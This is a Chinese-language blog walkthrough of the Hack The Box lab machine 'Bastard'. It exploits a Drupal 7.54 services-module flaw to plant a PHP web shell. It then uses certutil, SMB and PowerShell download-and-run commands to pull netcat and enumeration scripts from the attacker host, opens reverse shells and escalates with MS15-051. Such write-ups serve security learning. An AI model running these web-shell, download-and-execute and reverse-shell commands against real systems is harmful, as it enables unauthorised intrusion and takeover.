> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Y6I1xSzVuXqlzovyclappw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **57** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/6

靶机难度：中等（4.7/10）

靶机发布日期：2017 年 10 月 14 日

靶机描述：

Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT22mEQWtw6aBts4iaYLr2W1o9hf92icTfwtWynBBBBqK72AV6tsDVLxZg/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.9，windows 系统的靶机...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTdS5VXqAvvRUC6PlyFRppwjfW6XrfTlIcP0JzVq1NdPIE1GMY4tgbrA/640?wx_fmt=png)

nmap 发现仅开放了 80、135、49154（msrpc）端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTwhPyhw8f85QWC0oAKFAbfOgVyJG3VSz6YEqhkmK9XzCVsYaagBGIRQ/640?wx_fmt=png)

可以看到这是一个 Drupal 7 CMS 架构的 web 服务器...CHANGELOG.txt 文件可以查看有关 Drupal CMS 确切发行版本的信息等... 看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTX8ZGwUNMhp1HPadsJv2eCiajsQ5WDo5ykb1xRTibf7AeEhMd7cFw2sLg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT1LzvTKFVZyJoBiaRwTzvj5wBCOrWFwNicBxZOia6lYAwafFwKVIafqP5A/640?wx_fmt=png)

whatweb 也可以看出...

可以看到版本是 Drupal 7.54....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTIDfUaCq1FyDfaBbL3xOGEfLM7HQpAruhxmXjrWEwibCYe7tsAdwaOMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT8GL9v2TLf8xA11JhyfZkbPfUY1mAeDOlg2d8aLlJUXiblaZScvJIDBw/640?wx_fmt=png)

利用

```
searchsploit -x 41564.php
```

查看发现可利用....  

7.54 我这边对 drupal 7.x 模块服务进行利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTZDX3L9PsBs6Vj3ncAIRqSyla0N43786oxCFCf7tdibakrOAaVAHskcg/640?wx_fmt=png)

```
./droopescan scan drupal -u 10.10.10.9
```

（服务器对我不友好，或者是友国人在捣乱，我经常不稳定网络）  

这里我还利用了 droopescan 脚本对机器进行 drupal 扫描，看看有哪些可利用的地方...[链接](https://github.com/droope/droopescan)

继续回到利用 41564.php 脚本进行利用... 将脚本放到本地，修改下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTXVxIGVPaDxibkpahwDm7IfibSAFlrnwicDnaPMj2NmKtodcEMK2IuVJXQ/640?wx_fmt=png)

```
echo(system($_GET["cmd"]))` 或者 `system($_REQUEST["cmd"]
```

执行必须安装：

```
apt-get install php-curl
```

这里一开始利用 rest_endpoint 不成功，然后利用 rest 后成功了... 主要 dirb 发现了存在 rest 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTh9r46IUicyiaFndWrEicwHoTdBz73GmSFGjvYdza9rKnfOAYbBkjNOzCQ/640?wx_fmt=png)

dirb 发现存在 rest 访问也发现成功的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTIbZut7F8IG1XeGOlLY4deFn4jP8UFsUNsS2kHwZ97vwFia8BJDkYKbQ/640?wx_fmt=png)

成功执行并获得了 session.json 和 user.json...

可以看到我前面执行 php 的时候，报错了几次，我调试了几次，有两处小地方需要调整下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTJzq2m53s6iauvam2M3oQ6N17ZLPJ5zoTpV306ztYib0zqVYm4QFUCaEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTokNHJ6DmzEAEWnk7wyoKSU54xnOsR35O5yMkRCb1UULBI38pibUribIw/640?wx_fmt=png)

需要调整的两个地方... 不然报错...

可以看到已经执行成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTxBIvhCYr0gGe3Vj3oEneG92bdoUSwwvDd268rFX7HzQFHSrGb0n7Fg/640?wx_fmt=png)

可以看到通过 php 写入的 cmd 已经可以读取对方 windows 的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTIXCqLeMOabPeoQdXXJc9HqmwgQwSNDwQnrCNPqELus98FmDsjgp5Ag/640?wx_fmt=png)

这里需要利用 sessions.json 文件进行会话劫持...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTX2BjAfGUjoFloVKRoliara7IJuV9FP25Zq4QJeP2nqUxatSC1ERxqbw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTZO02rFibdq7CKcD0O09Eho4LqPTkOaSBNLIxyUiaXlxqfCC9G0alEpBQ/640?wx_fmt=png)

还可以看到这是 X64 的系统...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTExRic0y4iatibIRs69y8q2rbfLcL6hDT2UzXantIEMDZAOibeQkA65HB1g/640?wx_fmt=png)

添加即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT4FJSfLea84XnIAWicwzBl9rhBKvOwwia9mbCOXcibo14BzTcOfpuTM2NA/640?wx_fmt=png)

可以看到已经登陆 admin 用户界面...

这里我目前知道两种方法能将 shellcode 上传到目标...

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

标准非应用层协议

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

在宿主机和远控服务器之间或不同的宿主机之间的通信使用标准非应用层协议，可能使用的协议非常多，具体事例包括网络层协议的使用，如互联网控制消息协议 (the Internet Control Message Protocol, ICMP)，传输层协议，如用户数据报协议 (the User Datagram Protocol，UDP)，会话层协议，如套接字安全协议 (SOCKS)，以及重定向 / 隧道协议，如 LAN 上串行协议 (Serial over LAN, SOL)。

在主机之间使用 ICMP 通信，是因为 ICMP 是互联网协议套件 (the Internet Protocol Suite) 的一部分，所有的 IP 兼容主机都能够实现 ICMP 协议。但它不像 TCP、UDP 等其他网络协议那样被监控，所以可以被攻击者用于隐藏流量。

请理解接下来的行为....

  

  

方法 1：

  

  

通过 certulti 下载 nc

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTaDdP8mgiavH5rwH97MH4UWlLTXqxp4ReMh913KHEGvibdA6zXHf4Bp3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTe2ue0IKvIicFETwNSDkFuJP4q4PUwe3fGaddko06yylGU7JjHgIw7aw/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?cmd=certutil%20-urlcache%20-f%20http://10.10.14.16:8000/nc64.exe nc64.exe
```

成功下载到 windows...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTKDqalB7LZkL3HFbCvvkAOlpfViblicFudN0kjkj5aia1HoQapmGmdj3icA/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?cmd=certutil -urlcache -f http://10.10.10.9/nc64.exe nc64.exe
```

成功获得反向 shell...

  

  

方法 2：

  

  

利用编写 php 进行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTkHgeMt2nSXNHUCib5aCtNdPtgDicWmQZlWo5rIoZkFy1oMBts88g9jmw/640?wx_fmt=png)

配置了执行请求 dayu，然后下载是 fupload...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTiaOnlsnsc1D5DTxkfkblIXkHHC1gAvKn7tQFkKs5OedUWibL1vVVO3icA/640?wx_fmt=png)

```
php
$url = 'http://10.10.10.9/';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';


$phpCode = <<<'EOD'
<?php
        if (isset($_REQUEST['fupload'])) {
                file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.16:8000/" . $_REQUEST['fupload']));
    };
    
        if (isset($_REQUEST['dayu'])) {
                echo "<pre>" . shell_exec($_REQUEST['dayu']) . "</pre>";
        };
?>
EOD;
 
$file = [
    'filename' => 'dayuxiyou.php',
    'data' => $phpCode
];
```

检查 php 执行正常...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTz9C2fM1FCL1zA3cnibsW93iaTPDkd0mxURH1EzkExuOGIYMUyhaSW5Zg/640?wx_fmt=png)

重新运行...

```
http://10.10.10.9/dayuxiyou.php?fupload=nc64.exe（上传nc.exe）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT704IrVmumpkbu4fibClPXZ2KhTNcUcMMYTPzrybL9o7IicO40eBzLtZw/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?dayu=nc64.exe&dayu=nc64.exe -e cmd 10.10.14.16 6001
```

成功获得反向 shell...

  

  

方法 3：

  

  

利用 kali 自带的 smbserver，并进行共享...

locate smbserver.py 查找...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT9RI6bdtRovhHxtxUj45CUDETjMrwAPU1kSjRSAR7Lt2WOtyDqEdbdQ/640?wx_fmt=png)

```
python /root/Desktop/dayuBastard/smbserver.py dayugongxiang /var/www/html/
```

开启共享文件，dayugongxiang ，然后 html 目录下放了 nc64.exe 或者 nc.exe 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTk51yicoAApS4AL2odDatkBJKqRRFOQnKI78Clvv8D2TrkSQvJQUOjdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTzFicqdFgGTCYdBbicfSTItb43ZB03ibnNIAGImEaz22XBVVlU54FERYtg/640?wx_fmt=png)

```
10.10.10.9/dayuxiyou.php?dayu=copy \\10.10.14.16\dayugongxiang\nc64.exe nc64.exe
```

可以看到已经成功复制文件进去...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTSHxo7ibW1ZKvo0asGMMsR8r1jia294fEPTgMr4UGP0kIHKx9D834fTicA/640?wx_fmt=png)

成功获得反向 shell...

  

  

方法 4：

  

  

利用官方介绍的方法进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTQhg8Rkk1oqn4EaIYTCOJVyib2UvcibWvTFdZXb0qTZYptEhyKO9FSWPQ/640?wx_fmt=png)

可以通过在 “模块” 页面上启用 PHP 筛选器模块来实现 PHP 执行。之后，只需浏览至添加内容，然后至文章。将 PHP 粘贴到文章正文中，将 “文本” 格式更改为 PHP 代码，然后单击 “预览” 可以轻松执行代码。---- 官方翻译...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT9Xq1ry6VuDibLG8QdJlqSMhD6aMw1eOvEfHkqjw5f6sQ16QIggq6fnA/640?wx_fmt=png)

在 Modules 找到了 PHP 模块，默认是没勾上的，勾上 save 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTEwviap6sVT6suduicWhDicY3KabaJ9zbST7TCZmTL647jsfhiaf2Hew4pQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT1umt8e8Vnx71UQwSuwjGqBRpnibYwW4Kr8vB4nEIec5WamsgSKpZnZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTibHxHEkw0hESnXicxibnibpUhicQejYbPNHP49Zp2hMia48zAibLliabWdsj2Q/640?wx_fmt=png)

PHP 代码提权：

```
[链接](https://gtfobins.github.io/gtfobins/php/#sudo)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT8A0o1QOw7XtAe7F5jzU5ibVNDiaxlRXOic3G0Hne47oicjXjTvILa4Lb7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTfZNsQJzLmFciaic9TkbvNeQDNd0GQKd4rRWiaA8koomjeGO0veJOicyMHQ/640?wx_fmt=png)

然后预览即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTLgoawqrwgSWbavTMVBamh8EbbxkAVEJLvN1tx9o9evNjjeeBMBiaia2g/640?wx_fmt=png)

仅仅通过这种方式就拥有了管理员... 使用起来更简单，但这也是官方给的一种方法...

  

  

使用 Powershell Empire-PowerUp.ps1

  

  

PowerShell Empire 是用于运行 Microsoft Windows 和 / 或 Windows Server 操作系统的计算机和服务器的开发后框架...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTQKibKzMUicKqYKSRrPSicamGPAABJdTUn6wsdMBiaiakOTaRt1J2gic47gKQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTp3I11bYDftJXCxKic8VgGWnb6xBZicUVHNvECqbbOa8KJiaGorAtTRDrw/640?wx_fmt=png)

注意：PowerUp.ps1 可以在 windows 内部运行，因此我们需要在文件 “Invoke-AllChecks” 的底部添加并保存...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT2XXfKNUicV7EANLtA8aQVLYeVx7Ul7yQfWbia67LgXBVo5veiaYNosG9g/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?dayu=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16:8000/PowerUp.ps1') | powershell -noprofile -
```

然后利用 PowerShell 上传执行 PowerUp.ps1...

过了几分钟，查看结果，可以看到访问被拒绝，说明没有管理员权限...

  

  

使用 Powershell Empire-Sherlock.ps1

  

  

Sherlock.ps1 脚本用于快速查找缺少的软件补丁，发现并解决本地特权升级漏洞...

使用 sherlock.ps1 查找漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT5mq9icpu1Jj3l4zeU89YOATJN2lEukGXlqLyon3BxaRcWibflLuiab69w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTU44tvP9M9LwHOSun8UAwzVFibZpldzUbwlDQ4sLqfgnqKTndumhrU1w/640?wx_fmt=png)

需要使用 **Find-AllVulns** 编辑文件，在文件末尾添加即可...

```
/root/.local/share/Trash/files/Sherlock/Sherlock.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTSUfZvSBic1lBbDX1fBpZsHFwia8KCtNBFRshjTGJmZzUiba7d7p7POmXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTicmOLC3oPlXQibAjpb1yRCF1y3W9q0W21wNnMgPDMhicibzicsbAS7KXvibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTGMlicjLFF4hib24vk1eZUcLavQzs1A7NibkicKBUvqxygEQe813qco1Gtg/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?dayu=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16:8000/Sherlock.ps1') | powershell -noprofile -
```

Appears Vulnerable 就是存在漏洞... 可以利用... 这边找找

在扫描出来的结果中，只发现了 ms10-092、ms15-051、ms16-032 漏洞可以利用...

```
[Sherlock.ps1脚本发现利用exe链接](https://github.com/SecWiki/windows-kernel-exploits/)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTB4RNKd8ADpKJ5KnDAM3Bl59rJJcbeic4eOD4iaRjG9wBQbzaL3EPPPug/640?wx_fmt=png)

下载地址上面已经给了...

利用 ms15-051x64.exe...

  

  

成功获得 user.txt

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTGwSMibV5ic3zpdUKVziaEuwoicYibTkrPiaut7tEtITjxarzkTTgKRsLFERA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTH2I9QowjHxuT6LTG7PPKTfjaO2AzK6JGtd9vZkmUoqic2sUFU9rOeeA/640?wx_fmt=png)

  

  

成功获得 root.txt

  

  

certutil：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTuiagTL3Y5qNzyicKZ8kV5xeE61tRibAAKVCxL4f1hEnap2QY0JEq6fkFA/640?wx_fmt=png)

```
certutil -urlcache -f http://10.10.14.16:8000/ms15-051x64.exe  dayucertutil.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTc9VZ2oBpLrnLibx7D8MoNM4NqyfwE2hn44MFaQO04DMicZHLEYB6t22g/640?wx_fmt=png)

```
dayucertutil.exe "nc.exe 10.10.14.16 6006 -e cmd.exe"
```

  

  

php 提权：

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTlCCQuWXUY0zAVZ2dGFXkJu2qBaw47qa1LAibgHH0QVbw5nJhPTZzwUA/640?wx_fmt=png)

上传 ms15-051.exe 不支持 “-”... 在本地改下名称...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTPxWotFnaB6UQK0esARl8QZUVHeMWsbxXGgBjZaic6TnX85X3NiaG6TAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTFxKh7ibjOAOKBwHXhpnxiaNdlLnglmdQ8UNOuEOWWKIoWEHgJ5bFx7bQ/640?wx_fmt=png)

成功输出命令...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJTPEJ5DwZLYVfYyNaRV0FSAzyEaHEGUmo8zjVT8ylcaYIMGVqh0EMLoA/640?wx_fmt=png)

```
http://10.10.10.9/dayuxiyou.php?fupload=dayums.exe&dayu=dayums.exe "nc64.exe -e cmd 10.10.14.16 6007"
```

成功提权....

  

  

smbserver：

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM4T7BsB417rZ9BlLTfyKJT71UAwFlGlvHgibicM8RYG1WUjM94Hc9nyLsaDjgmK3EPYZcU85TVUyyQ/640?wx_fmt=png)

利用 smbserver 共享目录进行操作... 成功提权获得 root.txt 信息...（root 信息不公布... 自行学习加油）

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

这里利用了四种不同的方法进行 windows 靶机渗透... 后期我会拿出百分百的精神，百分百的努力来对每一台靶机进行各种方式渗透，能想到的都会用上... 希望这种方式方法能让我记得更深，加油！！

可以看到前面还有很多信息没用写出来，自行挖掘把，ms16-032    ms10-092 这两个可利用的漏洞也没写，我试了发现是可行的，都需要通过 MSF 生成一个 EXE，然后得共享放到 windows 桌面上，然后利用提权即可...

要不断的生成想法，无论它们有多么的疯狂和牵强体会，用你大脑中的灰色物质来为它们搭建新的关联。

我更希望有人能和我分享别得方式方法来拿下这台靶机！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)